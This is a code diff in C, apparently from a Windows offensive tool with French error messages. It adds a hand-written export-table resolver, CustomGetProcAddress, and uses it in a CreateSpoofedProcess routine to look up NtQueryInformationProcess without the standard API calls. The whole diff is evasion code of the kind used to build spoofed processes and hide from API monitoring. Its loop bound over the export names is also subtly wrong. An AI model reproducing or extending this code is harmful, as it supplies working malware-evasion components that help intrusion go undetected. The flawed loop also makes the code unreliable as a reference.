@@ -153,6 +153,43 @@ HMODULE CustomGetModuleHandleW(LPCWSTR moduleName){
     return hModule;
 }
 
+FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
+    PBYTE pBase = (PBYTE) hModule;
+
+    //Cast DOS header
+    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
+    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
+        printf("[-] Erreur de recuperation du DOS Header\n");
+		return NULL;
+    }
+
+    //Get NTHeader ptr from DOS header
+    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
+		printf("[-] Erreur de recuperation du NtHeader\n");
+        return NULL;
+    }
+
+    //Get Optionalheader for NTHeader
+    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
+    //get _IMAGE_EXPORT_DIRECTORY addr from opt hdr
+    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY) (pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
+    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
+    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
+        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+        if (strcmp(lpProcName, pFunctionName) == 0) {
+            WORD wFunctionOrdinal = FunctionOrdinalArray[i];
+            PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);
+            return (FARPROC)pFunctionAddress;
+        }
+    }
+    return NULL;
+}
+
 LPCWSTR ConvertDataToLPCWSTR(BYTE* Data) {
     if (!Data) return NULL;
     int dataSize = MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)Data, -1, NULL, 0);
@@ -237,7 +274,7 @@ BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPC
     }
 
     // Résolution NtQuery
-    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)CustomGetProcAddress(CustomGetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
     
     PROCESS_BASIC_INFORMATION PBI = { 0 };
     ULONG ret = 0;
